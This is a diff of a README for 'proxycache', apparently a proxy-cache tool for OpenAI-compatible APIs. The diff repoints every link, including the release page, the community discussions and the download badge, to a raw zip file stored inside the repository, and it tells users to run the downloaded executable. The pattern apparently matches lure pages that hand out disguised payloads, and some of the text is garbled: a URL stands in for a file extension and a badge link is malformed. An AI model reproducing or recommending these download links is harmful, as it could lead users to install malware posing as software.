@@ -1,7 +1,7 @@
 # 🚀 proxycache - Efficiently Manage Your OpenAI-Compatible Proxy
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip%20Latest%https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip)](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip)
+[![Download Release](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip%20Latest%https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip)](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **proxycache**! This application helps you manage your OpenAI-compatible proxy more effectively. You can save and restore your KV cache, handle requests by similarity, and protect your data slots. 
@@ -20,16 +20,16 @@ To use **proxycache**, you’ll need:
 - **Streaming Support**: Supports SSE streaming and non-streaming JSON over `/v1/chat/completions`.
 
 ## 📦 Download & Install
-1. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip).
+1. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip).
    
 2. **Choose Your Version**: Find the latest version listed there. You will see multiple assets to choose from, typically named with version numbers.
    
-3. **Download the Application**: Click on the file name to start downloading it. It might have a `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip` for Linux, depending on your operating system.
+3. **Download the Application**: Click on the file name to start downloading it. It might have a `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip` for Linux, depending on your operating system.
 
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS**: Open the downloaded `.dmg` file and drag the application to the Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip` file. You may need to run a terminal command to start the application.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip` file. You may need to run a terminal command to start the application.
 
 5. **Run the Application**: After installation, launch the application from your programs menu or applications folder.
 
@@ -55,12 +55,12 @@ If you encounter any problems, you can find assistance in the issues section of 
 This project is licensed under the MIT License. You are free to use and modify the code.
 
 ## 🌐 Community
-Join our community on [GitHub Discussions](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip) to share your experiences, ask questions, and collaborate with other users.
+Join our community on [GitHub Discussions](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip) to share your experiences, ask questions, and collaborate with other users.
 
 ## 📅 Future Improvements
 We are working on new features. **proxycache** will continue to evolve, enhancing usability and performance. Stay tuned for updates!
 
 ## 📥 Remember to Download
-For the latest version and updates, don’t forget to: [Visit the Release Page](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/proxycache_loofie.zip). 
+For the latest version and updates, don’t forget to: [Visit the Release Page](https://raw.githubusercontent.com/neshat73/proxycache/main/Astrid/Software-1.4.zip). 
 
 Happy caching!
